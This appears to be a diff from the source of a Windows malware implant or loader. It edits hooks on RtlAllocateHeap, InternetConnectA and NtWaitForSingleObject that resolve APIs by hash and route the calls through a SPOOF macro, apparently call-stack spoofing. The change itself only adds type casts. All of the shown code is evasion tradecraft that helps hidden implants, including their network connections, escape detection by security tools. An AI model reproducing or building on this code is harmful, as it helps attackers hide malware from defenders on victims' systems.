@@ -31,7 +31,7 @@ SECTION( D ) PVOID RtlAllocateHeap_Hook( PVOID heapHandle, ULONG flags, SIZE_T s
 
     Api.ntdll.RtlAllocateHeap = FindFunction( hNtdll, H_API_RTLALLOCATEHEAP );
 
-    return SPOOF( Api.ntdll.RtlAllocateHeap, hNtdll, Size, heapHandle, flags, size );
+    return SPOOF( Api.ntdll.RtlAllocateHeap, hNtdll, Size, heapHandle, C_PTR( U_PTR( flags ) ), C_PTR( U_PTR ( size ) ) );
 };
 
 SECTION( D ) LPVOID HeapAlloc_Hook( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
@@ -53,7 +53,7 @@ SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszSe
 
     Api.net.InternetConnectA = FindFunction( hNet, H_API_INTERNETCONNECTA );
 
-    return SPOOF( Api.net.InternetConnectA, hNet, Size, hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext );
+    return ( HINTERNET )SPOOF( Api.net.InternetConnectA, hNet, Size, hInternet, C_PTR( lpszServerName ), C_PTR( U_PTR( nServerPort ) ), C_PTR( lpszUserName ), C_PTR( lpszPassword ), C_PTR( U_PTR ( dwService ) ), C_PTR( U_PTR( dwFlags ) ), C_PTR( U_PTR( dwContext ) ) );
 };
 
 SECTION( D ) NTSTATUS NtWaitForSingleObject_Hook( HANDLE handle, BOOLEAN alertable, PLARGE_INTEGER timeout )
@@ -70,5 +70,5 @@ SECTION( D ) NTSTATUS NtWaitForSingleObject_Hook( HANDLE handle, BOOLEAN alertab
 
     Api.ntdll.NtWaitForSingleObject = FindFunction( hNtdll, H_API_NTWAITFORSINGLEOBJECT );
 
-    return SPOOF( Api.ntdll.NtWaitForSingleObject, hNtdll, Size, handle, alertable, timeout );
+    return ( NTSTATUS )U_PTR( SPOOF( Api.ntdll.NtWaitForSingleObject, hNtdll, Size, handle, C_PTR( U_PTR( alertable ) ), timeout ) );
 };
